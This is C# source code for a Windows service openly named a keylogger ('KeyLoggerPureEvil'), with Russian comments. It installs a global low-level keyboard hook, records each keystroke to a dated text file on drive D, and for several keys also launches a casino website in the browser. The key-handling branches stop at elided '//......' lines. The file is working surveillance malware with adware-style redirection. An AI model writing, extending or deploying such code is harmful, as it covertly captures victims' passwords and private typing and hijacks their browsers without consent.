using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLoggerPureEvil
{
    public partial class Service1 : ServiceBase
    {
        KeyLogger keyLogger;
        public Service1()
        {
            InitializeComponent();
            CanStop = true;
            CanPauseAndContinue = true;
            AutoLog = true;
        }

        protected override void OnStart(string[] args)
        {
            keyLogger = new KeyLogger();
            Thread KeyLoggerThread = new Thread(new ThreadStart(keyLogger.SetHook));
            KeyLoggerThread.Start();
        }

        protected override void OnStop()
        {
            keyLogger.UnHook();
        }
    }
    public class KeyLogger
    {

        //Загрузка функция для установки хука
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callBack, IntPtr hInstance, uint threadId);
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        //номер глобального LowLevel - хука на клавиатуру
        const int WH_KEYBOARD_LL = 13;
        //const int WH_KEYBOARD_LL = 12; // Мышка
        //cообщение нажатия на клавиатуру 
        const int WM_KEYDOWN = 0x100;
        //const int WM_MOUSEDOWN = 0x101; Мышка

        private LowLevelKeyboardProc _proc = hookProc;
        private static IntPtr hhook = IntPtr.Zero;


        public void SetHook()
        {
            writelog("хук установлен");
            IntPtr hInstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
        }
        public void UnHook()
        {
            writelog("хук выклчен");
            UnhookWindowsHookEx(hhook);
        }

        private void writelog(string v)
        {
            using (StreamWriter writer = new StreamWriter(@"D:\log.txt")) {
                writer.WriteLine(v);
            }

        }

        private static IntPtr hookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            //Обработка нажатия 
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string dt = DateTime.Now.Day + "_" + DateTime.Now.Month + "_" + DateTime.Now.Year;
                string fileName = @"D:\Key" + dt + ".txt";
                if (!File.Exists(fileName))
                {
                    using (FileStream fs = File.Create(fileName)) ;
                }
                using (StreamWriter sw = new StreamWriter(fileName, append: true))
                {
                    //https://www.combiaressearch.com/articles/15/javascript-char-coles-key-codes
                    if (vkCode.ToString() == "17")
                    {
                        sw.Write("CTRL");
                        Process.Start("http://joycasino1.site/");
                    }
                    else if (vkCode.ToString() == "65")
                    {
                        sw.Write("A");
                        Process.Start("http://joycasino1.site/");

                    }
                    else if (vkCode.ToString() == "66")
                    {
                        sw.Write("B");
                        Process.Start("http://joycasino1.site/");

                    }
                    else if (vkCode.ToString() == "67")
                    {
                        sw.Write("C");
                        Process.Start("http://joycasino1.site/");

                    }
                    else if (vkCode.ToString() == "68")
                    {
                        sw.Write("D");
                        Process.Start("http://joycasino1.site/");

                    }
                    else if (vkCode.ToString() == "69")
                    {
                        sw.Write("E");
                        Process.Start("http://joycasino1.site/");

                    }
                    //......
                    //......
                    //......
                    //......

                }
                return (IntPtr)0;
            }
            else
            {
                return CallNextHookEx(hhook, nCode, (int)wParam, lParam);
            }
        }
    }
}
